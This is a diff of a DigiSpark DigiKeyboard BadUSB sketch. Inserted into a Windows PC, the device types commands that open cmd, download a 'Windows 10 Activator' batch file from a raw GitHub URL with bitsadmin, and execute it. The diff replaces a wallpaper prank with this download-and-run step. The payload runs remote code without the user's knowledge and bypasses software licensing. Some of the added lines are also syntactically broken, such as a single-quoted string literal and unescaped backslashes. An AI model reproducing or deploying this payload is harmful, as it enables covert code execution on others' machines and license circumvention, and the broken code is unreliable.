@@ -1,5 +1,5 @@
 //This DigiKeyboard Script activates Windows 10 ( any version !! ) by using the script at
-( https://raw.githubusercontent.com/applebanana996/Windows-10-Activator/master/Windows%2010%20Activator.bat ) 
+// ( https://raw.githubusercontent.com/KushagraKarira/Scripts/master/Hacking/applebanana996/Windows%2010%20Activator.bat )
 
 #include "DigiKeyboard.h"
 void setup() {
@@ -7,27 +7,28 @@ void setup() {
 }
 void loop() {
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
+  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT); // first char bug
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
   DigiKeyboard.print("cmd");
-  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT, MOD_SHIFT_LEFT, KEY_ENTER);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); // as normal user
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("bitsadmin /transfer mydownloadjob /download /priority normal "https://raw.githubusercontent.com/applebanana996/Windows-10-Activator/master/Windows%2010%20Activator.bat" "C:\Downloads\WinChan.bat"");
+  DigiKeyboard.print('bitsadmin /transfer mydownloadjob /download /priority normal "https://raw.githubusercontent.com/KushagraKarira/Scripts/master/Hacking/applebanana996/Windows%2010%20Activator.bat" "C:\Downloads\WinChan.bat"');
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("$client.DownloadFile(\"https://raw.githubusercontent.com/applebanana996/Windows-10-Activator/master/Windows%2010%20Activator.bat\" , \"WindowsChan.bat\")");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /d \"%USERPROFILE%\\doge.jpg\" /f");
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True");
+  DigiKeyboard.print("start C:\Downloads\WinChan.bat"); // execute file
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
   DigiKeyboard.print("exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  for(;;){ /*empty*/ }
+
+  digitalWrite(1, HIGH); //turn on led when program finishes
+  DigiKeyboard.delay(90000);
+  digitalWrite(1, LOW);
+  DigiKeyboard.delay(5000);
+
+  for (;;) {
+    /*empty*/
+  }
 }
